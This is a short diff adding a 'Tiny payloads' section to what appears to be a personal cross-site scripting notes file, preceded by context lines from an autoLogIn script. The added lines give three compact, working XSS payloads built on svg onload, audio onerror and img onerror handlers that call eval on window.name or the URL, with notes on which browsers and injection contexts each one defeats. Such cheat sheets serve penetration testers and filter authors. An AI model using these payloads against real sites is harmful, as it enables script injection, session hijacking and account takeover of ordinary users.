@@ -236,5 +236,12 @@ console.log("above code doesn't block main function stack");
 		autoLogIn()
 		</script>
 
-
-
+Tiny payloads
+	 If you control the name, will work on Firefox in any context, will fail in chromium in DOM
+	 	Only works as reflected XSS
+	 	In chrome, also works inside innerHTML, even for elements not yet inserted into DOM
+		<svg><svg/onload=eval(name)>
+	If you control window's name, will work inside innerHTML on elements not yet inserted into the DOM 
+		<audio/src/onerror=eval(name)>
+	If you control the URL, will work inside innerHTML on elements not yet inserted into the DOM
+		<img/src/onerror=eval(`'`+URL)>
